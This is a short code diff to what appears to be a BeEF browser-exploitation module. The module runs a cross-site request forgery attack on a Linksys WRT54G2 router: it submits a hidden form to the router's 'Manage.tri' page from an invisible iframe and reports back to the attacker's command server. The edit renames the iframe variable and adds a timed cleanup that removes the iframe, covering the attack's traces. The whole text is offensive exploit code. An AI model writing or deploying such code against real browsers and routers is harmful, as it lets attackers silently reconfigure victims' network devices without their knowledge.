@@ -20,7 +20,7 @@ beef.execute(function() {
 
   var target = gateway + "Manage.tri";
 
-  var iframe = beef.dom.createInvisibleIframe();
+  var wrt54g2_iframe = beef.dom.createInvisibleIframe();
 
   var form = document.createElement('form');
   form.setAttribute('action', target);
@@ -100,8 +100,15 @@ beef.execute(function() {
   input.setAttribute('value', 'en');
   form.appendChild(input);
 
-  iframe.contentWindow.document.body.appendChild(form);
+  wrt54g2_iframe.contentWindow.document.body.appendChild(form);
   form.submit();
 
   beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");
+
+  cleanup = function() {
+    document.body.removeChild(wrt54g2_iframe);
+  }
+  setTimeout("cleanup()", 15000);
+
 });
+
